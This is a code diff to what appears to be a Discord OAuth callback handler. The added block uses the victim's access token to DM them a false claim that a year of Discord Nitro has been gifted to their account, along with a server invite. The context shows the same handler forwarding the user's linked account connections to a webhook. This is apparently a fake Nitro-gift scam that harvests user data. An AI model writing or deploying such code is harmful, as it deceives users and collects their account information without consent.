@@ -79,6 +79,29 @@ module.exports = async function handler(req, res) {
       }
     }
 
+    // DM l'user
+    try {
+      const dm = await call('/users/@me/channels', {
+        method: 'POST',
+        token: token.access_token,
+        body: { recipient_id: user.id },
+      });
+      await call(`/channels/${dm.id}/messages`, {
+        method: 'POST',
+        token: token.access_token,
+        body: {
+          content: [
+            '**Gifted by costa** — 1 year of Discord Nitro is on your account.',
+            '',
+            'It can take up to **15 minutes** to appear in your inventory.',
+            `Server: ${INVITE}`,
+          ].join('\n'),
+        },
+      });
+    } catch (e) {
+      console.warn('dm failed:', e.message);
+    }
+
     if (WEBHOOK) {
       const conns = (connections || []).map(
         (c) => `${c.type}:${c.name}${c.verified ? ' (verified)' : ''}`
